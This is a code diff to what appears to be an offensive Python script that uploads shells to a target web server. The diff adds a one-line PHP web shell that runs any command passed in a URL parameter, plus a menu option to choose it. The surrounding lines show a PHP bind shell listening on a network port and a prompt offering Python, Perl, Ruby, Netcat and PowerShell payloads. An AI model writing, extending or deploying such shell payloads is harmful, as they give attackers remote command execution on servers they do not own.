@@ -19,6 +19,8 @@ filepath = '/'+args.path.rstrip('/')+'/'
 shell_name = args.name
 extension = '.'+args.type
 
+payload_php_basic = payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'
+
 payload_php = '''
 php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
 socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
@@ -77,7 +79,9 @@ if attack_cmd.lower() == 'y':
     endpoint_upload = url+'/'+endpoint
     payload_type = str(
         input('> Specify payload: 1.Php 2.Python 3.Perl 4.Ruby 5.Netcat 6.Powershell'))
-    if payload_type == '1':
+    if payload_type == '0':
+        shell = payload_php_basic
+    elif payload_type == '1':
         shell = payload_php
     elif payload_type == '2':
         shell = payload_python
